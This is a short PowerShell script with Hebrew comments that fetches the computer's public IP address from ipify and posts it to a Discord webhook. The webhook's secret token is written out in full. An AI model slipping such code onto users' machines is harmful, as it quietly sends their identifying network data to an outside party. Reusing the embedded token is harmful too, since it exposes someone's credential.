# ה-WebHook של Discord
$webhook = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcpsOVjSLsS3rZyYGiRDS49oKPa0myTKTAnRJ_vwqNhaFggDyJOfhji-"

# מביא IP חיצונית מהשירות ipify
$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip

# הגוף לשליחה
$body = @{
    content = "ה-IP החיצונית של המחשב: $publicIP"
} | ConvertTo-Json

# שליחה ל-Discord
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
